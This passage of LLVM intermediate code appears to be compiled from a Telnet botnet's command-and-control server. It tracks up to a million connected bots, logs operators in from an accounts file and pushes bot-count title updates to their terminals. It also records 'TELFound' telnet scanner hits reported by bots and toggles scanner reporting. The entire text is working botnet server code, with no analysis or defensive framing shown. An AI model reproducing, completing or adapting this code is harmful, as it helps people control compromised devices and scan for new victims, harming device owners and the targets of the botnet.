  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = call i32 @accept(i32 %78, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %._crit_edge.loopexit, label %.lr.ph73

; <label>:81:                                     ; preds = %29
  %82 = sext i32 %33 to i64
  %83 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %82, i32 1
  store i8 1, i8* %83, align 4
  br label %.backedge60

.backedge60:                                      ; preds = %.backedge60.backedge, %81
  %.048 = phi i32 [ 0, %81 ], [ %.048.be, %.backedge60.backedge ]
  call void @llvm.memset.p0i8.i64(i8* nonnull %13, i8 0, i64 2048, i32 16, i1 false)
  %84 = call i32 @fdgets(i8* nonnull %8, i32 2048, i32 %33)
  %85 = sext i32 %84 to i64
  %86 = icmp sgt i32 %84, 0
  br i1 %86, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.backedge60
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %87 = phi i64 [ %107, %.backedge ], [ %85, %.lr.ph.preheader ]
  %strchr = call i8* @strchr(i8* nonnull %8, i32 10)
  %88 = icmp eq i8* %strchr, null
  br i1 %88, label %.critedge.loopexit, label %89

; <label>:89:                                     ; preds = %.lr.ph
  call void @trim(i8* nonnull %8)
  %90 = call i32 @strcmp(i8* nonnull %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %91 = icmp eq i32 %90, 0
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %89
  %93 = call i64 @send(i32 %33, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i64 5, i32 16384) #10
  %94 = icmp eq i64 %93, -1
  br i1 %94, label %.critedge.loopexit, label %.backedge

; <label>:95:                                     ; preds = %89
  %96 = call i8* @strstr(i8* nonnull %8, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0)) #9
  %97 = icmp eq i8* %96, %8
  br i1 %97, label %98, label %109

; <label>:98:                                     ; preds = %95
  %99 = getelementptr inbounds i8, i8* %96, i64 7
  %100 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %101 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %100, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* %99)
  %102 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %103 = call i32 @fflush(%struct._IO_FILE* %102)
  %104 = load volatile i32, i32* @TELFound, align 4
  %105 = add nsw i32 %104, 1
  store volatile i32 %105, i32* @TELFound, align 4
  br label %.backedge

.backedge:                                        ; preds = %98, %110, %112, %116, %92, %113
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 2048, i32 16, i1 false)
  %106 = call i32 @fdgets(i8* nonnull %8, i32 2048, i32 %33)
  %107 = sext i32 %106 to i64
  %108 = icmp sgt i32 %106, 0
  br i1 %108, label %.lr.ph, label %.critedge.loopexit

; <label>:109:                                    ; preds = %95
  %strncmp = call i32 @strncmp(i8* nonnull %8, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i64 7)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %110, label %111

; <label>:110:                                    ; preds = %109
  store volatile i32 1, i32* @scannerreport, align 4
  br label %.backedge

; <label>:111:                                    ; preds = %109
  %strncmp52 = call i32 @strncmp(i8* nonnull %8, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i64 0, i64 0), i64 14)
  %cmp53 = icmp eq i32 %strncmp52, 0
  br i1 %cmp53, label %112, label %113

; <label>:112:                                    ; preds = %111
  store volatile i32 0, i32* @scannerreport, align 4
  br label %.backedge

; <label>:113:                                    ; preds = %111
  %114 = call i32 @strcmp(i8* nonnull %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0)) #9
  %115 = icmp eq i32 %114, 0
  br i1 %115, label %.backedge, label %116

; <label>:116:                                    ; preds = %113
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0), i8* nonnull %8)
  br label %.backedge

.critedge.loopexit:                               ; preds = %92, %.lr.ph, %.backedge
  %.lcssa.ph = phi i64 [ %87, %92 ], [ %87, %.lr.ph ], [ %107, %.backedge ]
  %.149.ph = phi i32 [ 1, %92 ], [ 1, %.lr.ph ], [ %.048, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.backedge60
  %.lcssa = phi i64 [ %85, %.backedge60 ], [ %.lcssa.ph, %.critedge.loopexit ]
  %.149 = phi i32 [ %.048, %.backedge60 ], [ %.149.ph, %.critedge.loopexit ]
  switch i64 %.lcssa, label %118 [
    i64 -1, label %.loopexit.loopexit
    i64 0, label %.loopexit.loopexit
  ]

; <label>:118:                                    ; preds = %.critedge
  %119 = icmp eq i32 %.149, 0
  br i1 %119, label %.backedge60.backedge, label %120

; <label>:120:                                    ; preds = %118
  store i8 0, i8* %83, align 4
  %121 = call i32 @close(i32 %33) #10
  br label %.backedge60.backedge

.backedge60.backedge:                             ; preds = %120, %118
  %.048.be = phi i32 [ %.149, %120 ], [ 0, %118 ]
  br label %.backedge60

.loopexit.loopexit:                               ; preds = %.critedge, %.critedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %41, %67, %73, %._crit_edge, %22
  %indvars.iv.next85 = add nuw nsw i64 %indvars.iv84, 1
  %122 = icmp slt i64 %indvars.iv.next85, %17
  br i1 %122, label %.lr.ph78, label %.loopexit61.outer.loopexit

; <label>:123:                                    ; preds = %57
  %124 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next, i32 0
  %125 = load i32, i32* %124, align 8
  %126 = load i32, i32* %45, align 8
  %127 = icmp eq i32 %125, %126
  br i1 %127, label %62, label %128

; <label>:128:                                    ; preds = %123, %57
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %129 = icmp slt i64 %indvars.iv.next.1, 1000000
  br i1 %129, label %47, label %.critedge58
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #6

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @make_socket_non_blocking(i32) unnamed_addr #0 {
  %2 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i32 0) #10
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i64 0, i64 0)) #12
  br label %10

; <label>:5:                                      ; preds = %1
  %6 = or i32 %2, 2048
  %7 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i32 %6) #10
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %10

; <label>:9:                                      ; preds = %5
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i64 0, i64 0)) #12
  br label %10

; <label>:10:                                     ; preds = %5, %9, %4
  %.0 = phi i32 [ -1, %4 ], [ -1, %9 ], [ 0, %5 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @fprintf(%struct._IO_FILE* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fflush(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @BotsConnected() local_unnamed_addr #7 {
  br label %1

; <label>:1:                                      ; preds = %1, %0
  %indvars.iv = phi i64 [ 0, %0 ], [ %indvars.iv.next.4, %1 ]
  %.07 = phi i32 [ 0, %0 ], [ %.0..4, %1 ]
  %2 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 1
  %3 = load i8, i8* %2, align 4
  %not. = icmp ne i8 %3, 0
  %4 = zext i1 %not. to i32
  %.0. = add nsw i32 %4, %.07
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %5 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next, i32 1
  %6 = load i8, i8* %5, align 4
  %not..1 = icmp ne i8 %6, 0
  %7 = zext i1 %not..1 to i32
  %.0..1 = add nsw i32 %7, %.0.
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %8 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next.1, i32 1
  %9 = load i8, i8* %8, align 4
  %not..2 = icmp ne i8 %9, 0
  %10 = zext i1 %not..2 to i32
  %.0..2 = add nsw i32 %10, %.0..1
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %11 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next.2, i32 1
  %12 = load i8, i8* %11, align 4
  %not..3 = icmp ne i8 %12, 0
  %13 = zext i1 %not..3 to i32
  %.0..3 = add nsw i32 %13, %.0..2
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %14 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next.3, i32 1
  %15 = load i8, i8* %14, align 4
  %not..4 = icmp ne i8 %15, 0
  %16 = zext i1 %not..4 to i32
  %.0..4 = add nsw i32 %16, %.0..3
  %indvars.iv.next.4 = add nsw i64 %indvars.iv, 5
  %exitcond.4 = icmp eq i64 %indvars.iv.next.4, 1000000
  br i1 %exitcond.4, label %17, label %1

; <label>:17:                                     ; preds = %1
  ret i32 %.0..4
}

; Function Attrs: noinline nounwind uwtable
define noalias i8* @TitleWriter(i8*) #0 {
  %2 = alloca [2048 x i8], align 16
  %3 = ptrtoint i8* %0 to i64
  %4 = trunc i64 %3 to i32
  %5 = getelementptr inbounds [2048 x i8], [2048 x i8]* %2, i64 0, i64 0
  br label %6

; <label>:6:                                      ; preds = %14, %1
  call void @llvm.memset.p0i8.i64(i8* nonnull %5, i8 0, i64 2048, i32 16, i1 false)
  %7 = call i32 @BotsConnected()
  %8 = load volatile i32, i32* @OperatorsConnected, align 4
  %9 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %5, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i64 0, i64 0), i32 27, i32 %7, i32 %8, i32 7) #10
  %10 = call i64 @strlen(i8* nonnull %5) #9
  %11 = call i64 @send(i32 %4, i8* nonnull %5, i64 %10, i32 16384) #10
  %12 = icmp eq i64 %11, -1
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %6
  ret i8* null

; <label>:14:                                     ; preds = %6
  %15 = call i32 @sleep(i32 2) #10
  br label %6
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #3

declare i32 @sleep(i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define i32 @Find_Login(i8* nocapture readonly) local_unnamed_addr #0 {
  %2 = alloca [512 x i8], align 16
  %3 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  %4 = icmp eq %struct._IO_FILE* %3, null
  br i1 %4, label %17, label %.preheader

.preheader:                                       ; preds = %1
  %5 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %6 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %7 = icmp eq i8* %6, null
  br i1 %7, label %._crit_edge.thread, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.015 = phi i32 [ %.0..011, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.0914 = phi i32 [ %.09., %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.01113 = phi i32 [ %11, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %8 = call i8* @strstr(i8* nonnull %5, i8* %0) #9
  %9 = icmp eq i8* %8, null
  %not. = xor i1 %9, true
  %10 = zext i1 %not. to i32
  %.09. = add nsw i32 %10, %.0914
  %.0..011 = select i1 %9, i32 %.015, i32 %.01113
  %11 = add nuw nsw i32 %.01113, 1
  %12 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %13 = icmp eq i8* %12, null
  br i1 %13, label %._crit_edge, label %.lr.ph

._crit_edge:                                      ; preds = %.lr.ph
  br i1 %4, label %15, label %._crit_edge.thread

._crit_edge.thread:                               ; preds = %.preheader, %._crit_edge
  %.0.lcssa19 = phi i32 [ %.0..011, %._crit_edge ], [ 0, %.preheader ]
  %.09.lcssa17 = phi i32 [ %.09., %._crit_edge ], [ 0, %.preheader ]
  %14 = call i32 @fclose(%struct._IO_FILE* nonnull %3)
  br label %15

; <label>:15:                                     ; preds = %._crit_edge, %._crit_edge.thread
  %.0.lcssa20 = phi i32 [ %.0..011, %._crit_edge ], [ %.0.lcssa19, %._crit_edge.thread ]
  %.09.lcssa18 = phi i32 [ %.09., %._crit_edge ], [ %.09.lcssa17, %._crit_edge.thread ]
  %16 = icmp eq i32 %.09.lcssa18, 0
  %..0 = select i1 %16, i32 0, i32 %.0.lcssa20
  br label %17

; <label>:17:                                     ; preds = %15, %1
  %.012 = phi i32 [ -1, %1 ], [ %..0, %15 ]
  ret i32 %.012
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define noalias i8* @BotWorker(i8*) #0 {
  %2 = alloca i64, align 8
  %3 = alloca [2048 x i8], align 16
  %4 = alloca [80 x i8], align 16
  %5 = alloca [5000 x i8], align 16
  %6 = alloca [5000 x i8], align 16
  %7 = alloca [5000 x i8], align 16
  %8 = alloca [5000 x i8], align 16
  %9 = alloca [5000 x i8], align 16
  %10 = alloca [5000 x i8], align 16
  %11 = alloca [5000 x i8], align 16
  %12 = alloca [5000 x i8], align 16
  %13 = alloca [5000 x i8], align 16
  %14 = alloca [80 x i8], align 16
  %15 = alloca [2048 x i8], align 16
  %16 = alloca [2048 x i8], align 16
  %17 = alloca [2048 x i8], align 16
  %18 = alloca [80 x i8], align 16
  %19 = alloca [80 x i8], align 16
  %20 = alloca [80 x i8], align 16
  %21 = alloca [80 x i8], align 16
  %22 = alloca [80 x i8], align 16
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  %25 = alloca [80 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [80 x i8], align 16
  %28 = alloca [80 x i8], align 16
  %29 = alloca [80 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [80 x i8], align 16
  %37 = alloca [80 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [2048 x i8], align 16
  %41 = alloca [2048 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [2048 x i8], align 16
  %45 = alloca i64, align 8
  %46 = alloca [50 x i8], align 16
  %47 = ptrtoint i8* %0 to i64
  %48 = trunc i64 %47 to i32
  %49 = load volatile i32, i32* @OperatorsConnected, align 4
  %50 = add nsw i32 %49, 1
  store volatile i32 %50, i32* @OperatorsConnected, align 4
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %51, i8 0, i64 2048, i32 16, i1 false)
  %52 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  %53 = tail call i32 @feof(%struct._IO_FILE* %52) #10
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %.lr.ph161.preheader, label %._crit_edge162.thread

.lr.ph161.preheader:                              ; preds = %1
  br label %.lr.ph161

._crit_edge162.thread:                            ; preds = %1
  tail call void @rewind(%struct._IO_FILE* %52)
  br label %.lr.ph158.preheader

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.lr.ph161
  %.0107159 = phi i32 [ %56, %.lr.ph161 ], [ 0, %.lr.ph161.preheader ]
  %55 = tail call i32 @fgetc(%struct._IO_FILE* %52)
  %56 = add nuw nsw i32 %.0107159, 1
  %57 = tail call i32 @feof(%struct._IO_FILE* %52) #10
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %.lr.ph161, label %._crit_edge162

._crit_edge162:                                   ; preds = %.lr.ph161
  tail call void @rewind(%struct._IO_FILE* %52)
  %59 = icmp eq i32 %.0107159, 0
  br i1 %59, label %._crit_edge, label %.lr.ph158.preheader

.lr.ph158.preheader:                              ; preds = %._crit_edge162.thread, %._crit_edge162
  %60 = phi i32 [ -1, %._crit_edge162.thread ], [ %.0107159, %._crit_edge162 ]
  %wide.trip.count = zext i32 %60 to i64
  br label %.lr.ph158

.lr.ph158:                                        ; preds = %.lr.ph158.preheader, %.lr.ph158
  %indvars.iv = phi i64 [ 0, %.lr.ph158.preheader ], [ %indvars.iv.next, %.lr.ph158 ]
  %61 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %indvars.iv, i32 0, i64 0
  %62 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %indvars.iv, i32 1, i64 0
  %63 = tail call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %52, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i64 0, i64 0), i8* %61, i8* %62) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph158

._crit_edge.loopexit:                             ; preds = %.lr.ph158
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge162
  %64 = tail call i64 @send(i32 %48, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.21, i64 0, i64 0), i64 22, i32 16384) #10
  %65 = icmp eq i64 %64, -1
  br i1 %65, label %.loopexit, label %66

; <label>:66:                                     ; preds = %._crit_edge
  %67 = call i32 @fdgets(i8* nonnull %51, i32 2048, i32 %48)
  %68 = icmp slt i32 %67, 1
  br i1 %68, label %.loopexit, label %69

; <label>:69:                                     ; preds = %66
  call void @trim(i8* nonnull %51)
  %70 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 0, i32 0, i64 0), i8* nonnull %51) #10
  %71 = call i32 @Find_Login(i8* nonnull %51)
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %72, i32 0, i64 0
  %74 = call i32 @strcmp(i8* nonnull %51, i8* %73) #9
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %103

; <label>:76:                                     ; preds = %69
  %77 = tail call i64 @send(i32 %48, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.23, i64 0, i64 0), i64 22, i32 16384) #10
  %78 = icmp eq i64 %77, -1
  br i1 %78, label %.loopexit, label %79

; <label>:79:                                     ; preds = %76
  %80 = call i32 @fdgets(i8* nonnull %51, i32 2048, i32 %48)
  %81 = icmp slt i32 %80, 1
  br i1 %81, label %.loopexit, label %82

; <label>:82:                                     ; preds = %79
  call void @trim(i8* nonnull %51)
  %83 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %72, i32 1, i64 0
  %84 = call i32 @strcmp(i8* nonnull %51, i8* %83) #9
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %103

; <label>:86:                                     ; preds = %82
  call void @llvm.memset.p0i8.i64(i8* nonnull %51, i8 0, i64 2048, i32 16, i1 false)
  %87 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  %88 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %88, i8 0, i64 2048, i32 16, i1 false)
  %89 = getelementptr inbounds [5000 x i8], [5000 x i8]* %5, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %89, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.26, i64 0, i64 0), i64 92, i32 1, i1 false)
  %90 = getelementptr inbounds [5000 x i8], [5000 x i8]* %6, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %90, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.27, i64 0, i64 0), i64 92, i32 1, i1 false)
  %91 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %91, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.28, i64 0, i64 0), i64 92, i32 1, i1 false)
  %92 = getelementptr inbounds [5000 x i8], [5000 x i8]* %8, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %92, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.29, i64 0, i64 0), i64 92, i32 1, i1 false)
  %93 = getelementptr inbounds [5000 x i8], [5000 x i8]* %9, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %93, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.30, i64 0, i64 0), i64 92, i32 1, i1 false)
  %94 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %94, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i64 0, i64 0), i64 92, i32 1, i1 false)
  %95 = getelementptr inbounds [5000 x i8], [5000 x i8]* %11, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %95, i8* getelementptr inbounds ([158 x i8], [158 x i8]* @.str.32, i64 0, i64 0), i64 158, i32 1, i1 false)
  %96 = getelementptr inbounds [5000 x i8], [5000 x i8]* %12, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %96, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i64 0, i64 0), i64 82, i32 1, i1 false)
  %97 = getelementptr inbounds [5000 x i8], [5000 x i8]* %13, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i64 0, i64 0), i64 9, i32 1, i1 false)
  %98 = getelementptr inbounds [80 x i8], [80 x i8]* %14, i64 0, i64 0
  %99 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %98, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.35, i64 0, i64 0), i8* %73) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %88, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.36, i64 0, i64 0), i64 84, i32 1, i1 false)
  %100 = call i64 @strlen(i8* nonnull %89) #9
  %101 = call i64 @send(i32 %48, i8* nonnull %89, i64 %100, i32 16384) #10
  %102 = icmp eq i64 %101, -1
  br i1 %102, label %.loopexit, label %113

; <label>:103:                                    ; preds = %82, %69
  %104 = tail call i64 @send(i32 %48, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0), i64 5, i32 16384) #10
  %105 = icmp eq i64 %104, -1
  br i1 %105, label %.loopexit, label %106

; <label>:106:                                    ; preds = %103
  %107 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %107, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.25, i64 0, i64 0), i64 48, i32 1, i1 false)
  %108 = call i64 @strlen(i8* nonnull %107) #9
  %109 = call i64 @send(i32 %48, i8* nonnull %107, i64 %108, i32 16384) #10
  %110 = icmp eq i64 %109, -1
  br i1 %110, label %.loopexit, label %111

; <label>:111:                                    ; preds = %106
  %112 = call i32 @sleep(i32 5) #10
  br label %.loopexit

; <label>:113:                                    ; preds = %86
  %114 = call i64 @strlen(i8* nonnull %90) #9
  %115 = call i64 @send(i32 %48, i8* nonnull %90, i64 %114, i32 16384) #10
  %116 = icmp eq i64 %115, -1
  br i1 %116, label %.loopexit, label %117

; <label>:117:                                    ; preds = %113
  %118 = call i64 @strlen(i8* nonnull %91) #9
  %119 = call i64 @send(i32 %48, i8* nonnull %91, i64 %118, i32 16384) #10
  %120 = icmp eq i64 %119, -1
  br i1 %120, label %.loopexit, label %121

; <label>:121:                                    ; preds = %117
  %122 = call i64 @strlen(i8* nonnull %92) #9
  %123 = call i64 @send(i32 %48, i8* nonnull %92, i64 %122, i32 16384) #10
  %124 = icmp eq i64 %123, -1
  br i1 %124, label %.loopexit, label %125

; <label>:125:                                    ; preds = %121
  %126 = call i64 @strlen(i8* nonnull %93) #9
  %127 = call i64 @send(i32 %48, i8* nonnull %93, i64 %126, i32 16384) #10
  %128 = icmp eq i64 %127, -1
  br i1 %128, label %.loopexit, label %129

; <label>:129:                                    ; preds = %125
  %130 = call i64 @strlen(i8* nonnull %94) #9
  %131 = call i64 @send(i32 %48, i8* nonnull %94, i64 %130, i32 16384) #10
  %132 = icmp eq i64 %131, -1
  br i1 %132, label %.loopexit, label %133

; <label>:133:                                    ; preds = %129
  %134 = call i64 @strlen(i8* nonnull %95) #9
  %135 = call i64 @send(i32 %48, i8* nonnull %95, i64 %134, i32 16384) #10
  %136 = icmp eq i64 %135, -1
  br i1 %136, label %.loopexit, label %137

; <label>:137:                                    ; preds = %133
  %138 = call i64 @strlen(i8* nonnull %96) #9
  %139 = call i64 @send(i32 %48, i8* nonnull %96, i64 %138, i32 16384) #10
  %140 = icmp eq i64 %139, -1
  br i1 %140, label %.loopexit, label %141

; <label>:141:                                    ; preds = %137
  %142 = call i64 @strlen(i8* nonnull %97) #9
  %143 = call i64 @send(i32 %48, i8* nonnull %97, i64 %142, i32 16384) #10
  %144 = icmp eq i64 %143, -1
  br i1 %144, label %.loopexit, label %145

; <label>:145:                                    ; preds = %141
  %146 = call i64 @strlen(i8* nonnull %98) #9
  %147 = call i64 @send(i32 %48, i8* nonnull %98, i64 %146, i32 16384) #10
  %148 = icmp eq i64 %147, -1
  br i1 %148, label %.loopexit, label %149

; <label>:149:                                    ; preds = %145
  %150 = call i64 @strlen(i8* nonnull %88) #9
  %151 = call i64 @send(i32 %48, i8* nonnull %88, i64 %150, i32 16384) #10
  %152 = icmp eq i64 %151, -1
  br i1 %152, label %.loopexit, label %153

; <label>:153:                                    ; preds = %149
  %154 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384) #10
  %155 = icmp eq i64 %154, -1
  br i1 %155, label %.loopexit, label %156

; <label>:156:                                    ; preds = %153
  %157 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  %sext109 = shl i64 %47, 32
  %158 = ashr exact i64 %sext109, 32
  %159 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %158, i32 0
  store i32 1, i32* %159, align 4
  %160 = call i32 @fdgets(i8* nonnull %51, i32 2048, i32 %48)
  %161 = icmp sgt i32 %160, 0
  br i1 %161, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %156
  %162 = getelementptr inbounds [50 x i8], [50 x i8]* %46, i64 0, i64 0
  %163 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %164 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %165 = getelementptr inbounds [2048 x i8], [2048 x i8]* %41, i64 0, i64 0
